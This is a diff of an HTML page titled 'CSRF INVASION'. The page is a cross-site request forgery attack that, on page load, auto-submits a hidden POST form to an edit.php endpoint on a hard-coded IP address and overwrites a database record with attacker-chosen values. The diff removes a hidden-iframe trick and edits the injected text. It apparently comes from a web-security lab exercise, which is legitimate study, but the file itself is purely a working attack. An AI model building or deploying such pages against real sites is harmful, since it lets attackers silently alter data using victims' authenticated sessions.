@@ -2,20 +2,12 @@
 <html>
   <head>
     <title> CSRF INVASION </title>
-    <script>
-      function prev(e){
-        this.setAttribute('action', '?');
-        this.setAttribute('target', 'evil_frame');
-        e.preventDefault();
-      }
-    </script>
   </head>
   <body onload="document.evil_form.submit();">
-       <form action='https://35.184.88.145/red/public/staff/states/edit.php?id=1' method='POST' target='_self' onsubmit='prev(event)' name='evil_form'>
-          <input type='hidden' name='name' value='I will be the greatest Hacker! (CSRF ATTACK)'/>
+       <form action='https://35.184.88.145/red/public/staff/states/edit.php?id=1' method='POST' name='evil_form'>
+          <input type='hidden' name='name' value='I will be an a8esome Hacker! (CSRF ATTACK)'/>
           <input type='hidden' name='code' value='AL'/>
           <input type='hidden' name='country_id' value='1'/>
        </form>
-    <iframe name='evil_frame'></iframe>
   </body>
 </html>
